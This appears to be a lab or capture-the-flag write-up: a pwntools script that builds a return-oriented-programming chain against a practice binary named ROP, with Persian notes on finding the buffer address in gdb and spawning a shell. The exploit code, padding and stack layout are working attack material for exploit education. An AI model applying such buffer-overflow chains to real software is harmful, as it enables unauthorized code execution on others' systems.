```
from pwn import *

exe = context.binary = ELF("./ROP")
r = ROP(exe)
r.call(exe.sym.correct_answer, [0xdabbadaa])
r.call(exe.sym.wrong_answer, [0xfacebaad, 0xfacefeed, 0xfacedead])
r.call(exe.sym.Access_Shell, [])
buffer_start = 0xffffd49c

chain = r.chain(buffer_start + 108 + 4)
print(chain)
amo = (108 + 4) * b"\x90" + chain
f = open("input.txt", "wb")
f.write(amo)
f.close()
```

طریقه به دست اوردن آدرس بافر به این صورت بوده است که با اجرای gdb و استفاده از دستور s به خط 
```cpp
    char input3[96];
```
میرسیم و سپس میزنیم
```
p/x &input3
```
و آدرس ابتدای بافر چاپ خواهد شد.
این اسکریپت ابتدا منطق مد نظر را داخل `r` وارد میکند و سپس با استفاده از ادرس
 به دست آمده از مرحله قبل ان را در قسمت `ebp` بافر تنطیم میکند
 و سپس با ذخیره فایل، کار را تمام میکند.
سپس میتوانیم با اجرای 
```
./ROP test
```
به `shell` برسیم.


# Run with:
```
python3 exp_rop.py
./ROP
```